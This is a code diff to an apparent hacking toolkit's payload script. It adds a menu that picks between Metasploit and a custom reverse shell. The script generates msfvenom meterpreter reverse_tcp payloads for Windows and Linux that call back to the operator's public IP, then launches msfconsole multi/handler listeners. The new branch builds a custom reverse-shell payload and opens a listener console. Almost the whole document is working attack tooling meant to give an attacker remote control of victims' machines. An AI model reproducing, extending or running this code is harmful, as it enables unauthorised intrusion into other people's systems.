@@ -1,8 +1,10 @@
 import os
 import subprocess
 import sys
-
-from .ipv4_script import get_public_ip
+from scripts.reverse_shell_target import configure
+from scripts.reverse_shell_console import ReverseShellConsole
+from scripts.ipv4_script import get_public_ip
+from scripts.reverse_shell_builder import Builder
 
 
 def payload_script(info, first, second, inputs, user, OS, the_link, error, warning, ip):
@@ -20,173 +22,206 @@ def payload_script(info, first, second, inputs, user, OS, the_link, error, warni
         .strip()
         .lower()
     )
+    print(
+        info
+        + first
+        + "Metasploit\n"
+        + info
+        + second
+        + "Reverse shell script (Touti Cracker's reverse shell)"
+    )
+    hacktype = (input(inputs + "Please choose an option(1/2):")).strip().lower()
     if attacktype == "1":
-        platformattack = (
-            input(inputs + "Choose the platform to attack (Windows/Linux): ")
-            .strip()
-            .lower()
-        )
-        payloadname = input(
-            inputs + "Please enter a name for your payload (with extension): "
-        ).strip()
-        extension = payloadname.split(".")[-1].lower()
-        script_dir = os.path.dirname(os.path.abspath(__file__))
-        payloadname = os.path.join(script_dir, payloadname)
-        port = (
-            input(inputs + "Please enter the port to use (default is 4444): ").strip()
-            or "4444"
-        )
+        if hacktype == "1":
+            if attacktype == "1":
+                platformattack = (
+                    input(inputs + "Choose the platform to attack (Windows/Linux): ")
+                    .strip()
+                    .lower()
+                )
+                payloadname = input(
+                    inputs + "Please enter a name for your payload (with extension): "
+                ).strip()
+                extension = payloadname.split(".")[-1].lower()
+                script_dir = os.path.dirname(os.path.abspath(__file__))
+                payloadname = os.path.join(script_dir, payloadname)
+                port = (
+                    input(
+                        inputs + "Please enter the port to use (default is 4444): "
+                    ).strip()
+                    or "4444"
+                )
+            if OS == "Windows":
+                try:
+                    test = subprocess.run(
+                        ["msfvenom.bat", "exit"],
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.PIPE,
+                        text=True,
+                    )
+                except subprocess.CalledProcessError as e:
+                    print(
+                        error
+                        + "Command failed! Please ensure that metasploit is in path"
+                    )
+                    print("Exit code:", e.returncode)
+                    print("STDERR:", e.stderr)
+                    sys.exit()
 
-        if OS == "Windows":
-            try:
-                test = subprocess.run(
-                    ["msfvenom.bat", "exit"],
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    text=True,
-                )
-            except subprocess.CalledProcessError as e:
-                print(
-                    error + "Command failed! Please ensure that metasploit is in path"
-                )
-                print("Exit code:", e.returncode)
-                print("STDERR:", e.stderr)
-                sys.exit()
+                if not test.returncode != 0:
+                    print(
+                        info
+                        + "[-] Metasploit is in the path and is correctly installed."
+                    )
+                    print(test.stderr)
 
-            if not test.returncode != 0:
-                print(
-                    info + "[-] Metasploit is in the path and is correctly installed."
-                )
-                print(test.stderr)
+                if platformattack == "windows":
+                    print(info + "Creating Payload...")
+                    command = (
+                        "msfvenom -p windows/meterpreter/reverse_tcp lhost="
+                        + ip
+                        + " lport="
+                        + port
+                        + " -f "
+                        + extension
+                        + " > "
+                        + payloadname
+                    )
 
-            if platformattack == "windows":
-                print(info + "Creating Payload...")
-                command = (
-                    "msfvenom -p windows/meterpreter/reverse_tcp lhost="
-                    + ip
-                    + " lport="
-                    + port
-                    + " -f "
-                    + extension
-                    + " > "
-                    + payloadname
-                )
+                    subprocess.run(
+                        command,
+                        shell=True,
+                        check=True,
+                        text=True,
+                    )
+                    print(
+                        info
+                        + "Your Payload has been created please verify the script floder"
+                    )
+                    print(info + "Creating a Tcp listener...")
 
-                subprocess.run(
-                    command,
-                    shell=True,
-                    check=True,
-                    text=True,
-                )
-                print(info+"Your Payload has been created please verify the script floder")
-                print(info + "Creating a Tcp listener...")
+                    process = subprocess.run(
+                        f'msfconsole -x "use exploit/multi/handler; '
+                        f"set payload windows/meterpreter/reverse_tcp; "
+                        f"set lhost {ip}; "
+                        f"set lport {port}; "
+                        f'exploit"',
+                        shell=True,
+                        text=True,
+                    )
 
-                process = subprocess.run(
-                    f'msfconsole -x "use exploit/multi/handler; '
-                    f"set payload windows/meterpreter/reverse_tcp; "
-                    f"set lhost {ip}; "
-                    f"set lport {port}; "
-                    f'exploit"',
-                    shell=True,
-                    text=True,
-                )
+                elif platformattack == "linux":
+                    print("Creating Payload...")
+                    command = (
+                        "msfvenom -p linux/x86/meterpreter/reverse_tcp lhost="
+                        + ip
+                        + " lport="
+                        + port
+                        + " -f "
+                        + extension
+                        + " > "
+                        + payloadname
+                    )
 
-            elif platformattack == "linux":
-                print("Creating Payload...")
-                command = (
-                    "msfvenom -p linux/x86/meterpreter/reverse_tcp lhost="
-                    + ip
-                    + " lport="
-                    + port
-                    + " -f "
-                    + extension
-                    + " > "
-                    + payloadname
-                )
+                    subprocess.run(
+                        command,
+                        shell=True,
+                        check=True,
+                        text=True,
+                    )
 
-                subprocess.run(
-                    command,
-                    shell=True,
-                    check=True,
-                    text=True,
-                )
+                    print(info + "Creating a Tcp listener...")
 
-                print(info + "Creating a Tcp listener...")
+                    subprocess.run(
+                        "msfconsole -x 'use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost "
+                        + ip
+                        + "; set lport "
+                        + port
+                        + "; exploit'",
+                        shell=True,
+                        text=True,
+                    )
 
-                subprocess.run(
-                    "msfconsole -x 'use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost "
-                    + ip
-                    + "; set lport "
-                    + port
-                    + "; exploit'",
-                    shell=True,
-                    text=True,
-                )
-
-                print(info + "Creating a Tcp listener...")
-        elif OS == "Linux":
-            if platformattack == "windows":
-                print("Creating Payload...")
-                command = (
-                    "msfvenom -p windows/meterpreter/reverse_tcp lhost="
-                    + ip
-                    + " lport="
-                    + port
-                    + " -f "
-                    + extension
-                    + " > "
-                    + payloadname
-                )
-                subprocess.run(command, shell=True, text=True)
-                print(info + "Creating a Tcp listener...")
-                subprocess.run(
-                    "msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost "
-                    + ip
-                    + "; set lport "
-                    + port
-                    + "; exploit'",
-                    shell=True,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    text=True,
-                )
-            elif platformattack == "linux":
-                print("Creating Payload...")
-                command = (
-                    "msfvenom -p linux/x86/meterpreter/reverse_tcp lhost="
-                    + ip
-                    + " lport="
-                    + port
-                    + " -f "
-                    + extension
-                    + " > "
-                    + payloadname
-                )
-                subprocess.run(command, shell=True, text=True)
-                print(info + "Creating a Tcp listener...")
-                subprocess.run(
-                    "msfconsole -x 'use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost "
-                    + ip
-                    + "; set lport "
-                    + port
-                    + "; exploit'",
-                    shell=True,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    text=True,
-                )
+                    print(info + "Creating a Tcp listener...")
+            elif OS == "Linux":
+                if platformattack == "windows":
+                    print("Creating Payload...")
+                    command = (
+                        "msfvenom -p windows/meterpreter/reverse_tcp lhost="
+                        + ip
+                        + " lport="
+                        + port
+                        + " -f "
+                        + extension
+                        + " > "
+                        + payloadname
+                    )
+                    subprocess.run(command, shell=True, text=True)
+                    print(info + "Creating a Tcp listener...")
+                    subprocess.run(
+                        "msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost "
+                        + ip
+                        + "; set lport "
+                        + port
+                        + "; exploit'",
+                        shell=True,
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.PIPE,
+                        text=True,
+                    )
+                elif platformattack == "linux":
+                    print("Creating Payload...")
+                    command = (
+                        "msfvenom -p linux/x86/meterpreter/reverse_tcp lhost="
+                        + ip
+                        + " lport="
+                        + port
+                        + " -f "
+                        + extension
+                        + " > "
+                        + payloadname
+                    )
+                    subprocess.run(command, shell=True, text=True)
+                    print(info + "Creating a Tcp listener...")
+                    subprocess.run(
+                        "msfconsole -x 'use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost "
+                        + ip
+                        + "; set lport "
+                        + port
+                        + "; exploit'",
+                        shell=True,
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.PIPE,
+                        text=True,
+                    )
+                else:
+                    print(
+                        error
+                        + "MacOS and Android are not supported yet but it will be in the next update. StayTuned: "
+                        + the_link
+                    )
             else:
                 print(
                     error
-                    + "MacOS and Android are not supported yet but it will be in the next update. StayTuned: "
+                    + "MacOS and Android are not supported yet but it will be in the next update and much more !. StayTuned: "
                     + the_link
                 )
-        else:
-            print(
-                error
-                + "MacOS and Android are not supported yet but it will be in the next update and much more !. StayTuned: "
-                + the_link
-            )
+        elif hacktype == "2":
+            if attacktype == "1": 
+                payloadname = input(
+                    inputs + "Please enter a name for your payload: "
+                ).strip()
+                extension = payloadname.split(".")[-1].lower()
+                port = (
+                    input(
+                        inputs + "Please enter the port to use (default is 5000): "
+                    ).strip()
+                    or "5000"
+                )
+            HOST = "0.0.0.0"
+            configure(host=HOST, port=port)
+            Builder(name=payloadname)
+            ReverseShellConsole(info=info)
     elif attacktype == "2":
         platformattack = (
             input(inputs + "Choose the platform to attack (Windows/Linux): ")
